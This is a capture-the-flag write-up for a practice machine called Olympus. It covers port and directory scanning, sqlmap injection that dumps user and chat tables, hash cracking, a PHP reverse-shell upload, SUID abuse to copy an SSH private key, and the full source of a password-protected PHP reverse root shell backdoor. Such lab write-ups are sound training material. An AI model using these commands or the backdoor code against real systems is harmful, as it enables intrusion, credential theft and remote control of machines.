{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start by scanning the ports.")}}

{{console("nmap -T5 -p- 10.10.234.116", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 22:11 CET
Nmap scan report for 10.10.234.116
Host is up (0.079s latency).
Not shown: 56365 closed tcp ports (conn-refused), 9168 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 433.33 seconds")}}

{{text("We find 2 open ports.")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{header()}}

{{text("Let's visit the web page.")}}

{{text("Before that, we have to add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>olympus.thm</code> to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{image("../../static/writeups/ohmyweb/images/000001.jpg")}}

{{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>gobuster</code> to enumerate through hidden directories.")}}

{{console("gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================")}}

{{text("We find an interesting platform 'each and everyone of you to express their needs and desires' at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://olympus.thm/~webmaster/</code>")}}

{{image("../../static/writeups/ohmyweb/images/000002.jpg")}}

{{text("What looked interesting to me was the search form at the bottom of the page. I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Burp</code> to catch a request of it and saved it into a file.")}}

{{console("sqlmap -r request.txt --tables", "        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:15:14 /2024-12-09/

[23:15:14] [INFO] parsing HTTP request from 'request.txt'
...
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
...")}}

{{text("I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>olympus</code> database and a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>flag</code> table that contained the first flag.")}}

{{text("I wanted to check the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>users</code> table for any sort of credentials I could use.")}}

{{console("sqlmap -r request.txt -D olympus -T users --dump", "        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:18:43 /2024-12-09/

[23:18:43] [INFO] parsing HTTP request from 'request.txt'
...
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$[REDACTED]                                            | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$[REDACTED]                                            | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$[REDACTED]                                            | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+")}}

{{text("We found 3 users and  their password hashes. We now can save them into a file and use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> to crack them.")}}

{{console("john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt", "Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]       (?)     
1g 0:00:01:37 0.03% (ETA: 2024-12-13 15:14) 0.01030g/s 54.88p/s 151.2c/s 151.2C/s lightbulb..huevos
1g 0:00:01:40 0.03% (ETA: 2024-12-13 14:24) 0.009972g/s 55.28p/s 151.4c/s 151.4C/s chopper1..killa1")}}

{{text("I was only able to crack the first password. That will have to do.")}}

{{text("We can use his e-mail and password to log into the site.")}}

{{image("../../static/writeups/ohmyweb/images/000003.jpg")}}

{{text("I have tried enumerating this page, but couldn't find anything interesting.")}}

{{text("After taking another look at the user's credentials I noticed the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>chat.olympus.thm</code> in the user_email field.")}}

{{text("I added that entry to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and visited it.")}}

{{text("After getting back a login form, I entered the same user's username (not the e-mail) and password as the last page and logged in.")}}

{{image("../../static/writeups/ohmyweb/images/000004.jpg")}}

{{text("I tried looking for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>prometheus_password.txt</code> file, I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://chat.olympus.thm/uploads</code> page but couldn't find that file.")}}

{{text("Once again I returned to using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlmap</code> and this time I checked the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>chats</code> table.")}}

{{console("sqlmap -r request.txt -D olympus -T chats --dump", "        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:25:30 /2024-12-10/

[00:25:30] [INFO] parsing HTTP request from 'request.txt'
...
Database: olympus
Table: chats
[3 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+")}}

{{text("The file was saved under the name <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>47c3210d51761686f3af40a875eeaaea.txt</code>.")}}

{{text("Sadly, it wasn't enough.")}}

{{image("../../static/writeups/ohmyweb/images/000004.jpg")}}

{{text("I proceeded to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copied a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PHP PentestMonkey</code> reverse shell into a file.")}}

{{text("I then tried uploading it through the chat.")}}

{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}

{{text("After it successfully uploaded, I once again dumped the contents of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>chats</code> table and used the file name that was generated for my file.")}}

{{text("If after uploading a file you can't see it while dumping the table, be sure to delete the previous logs so that it updates.")}}

{{text("After setting up a listener and going to the correct URL, I got a connection.")}}

{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}

{{header()}}

{{text("While enumerating my user, I found an interesting file with SUID bit set.")}}

{{console("find / -perm -4000 2>/dev/null", "/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
...")}}

{{text("I simply used it to copy user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>zeus</code> private key.")}}

{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}

{{text("After copying the key to my computer and trying to log in as <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>zeus</code> I got prompted for a passphrase to the key.")}}

{{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ssh2john</code> and then <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> to brute-force the password.")}}

{{text("After a while, I got the passphrase and used it to log in.")}}

{{header}}

{{text("For a long time I couldn't find anything interesting, even while using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code>.")}}

{{text("Then I found a file inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc</code> directory.")}}

{{console("cat VIGQFQFMYOST.php", "<?php
$pass = 'a7c5ffcf139742f52a5267c4a0674129';
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>")}}

{{text("I went to this file in my browser and it asked me for a password.")}}

{{image("../../static/writeups/ohmyweb/images/000006.jpg")}}

{{text("I entered the password from the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>$pass</code> variable and it worked.")}}

{{image("../../static/writeups/ohmyweb/images/000007.jpg")}}

{{text("I used the remote method and was able to become root.")}}

{{image("../../static/writeups/ohmyweb/images/000008.jpg")}}